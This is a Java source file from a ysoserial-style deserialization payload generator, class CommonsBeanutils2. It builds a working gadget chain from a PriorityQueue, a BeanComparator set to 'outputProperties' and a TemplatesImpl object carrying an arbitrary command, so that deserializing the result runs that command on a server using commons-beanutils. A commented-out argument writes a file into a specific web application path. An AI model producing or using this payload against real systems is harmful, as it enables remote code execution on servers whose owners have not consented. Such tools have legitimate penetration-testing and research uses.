package yso.payloads;

import yso.payloads.annotation.Authors;
import yso.payloads.annotation.Dependencies;
import yso.payloads.util.Gadgets;
import yso.payloads.util.PayloadRunner;
import org.apache.commons.beanutils.BeanComparator;

import java.util.PriorityQueue;

import static yso.payloads.util.Reflections.setFieldValue;

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2","commons-logging:commons-logging:1.2"})
@Authors({ Authors.PHITHON })
public class CommonsBeanutils2 implements ObjectPayload<Object>  {

    //    @Override
    public Object getObject(String command) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(command);
        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{templates, templates});

        return queue;
    }

    public static String main(String[] args) throws Exception {
//        args = new String[]{"upload_file_base64:..//webapps//CDGServer3//testttttt.txt|YWJjMTIz"};
//        PayloadRunner.run(CommonsBeanutils2.class, args);
        String s1 = PayloadRunner.run(CommonsBeanutils2.class, args);
//        System.out.println(s1);
        return s1;
    }
}
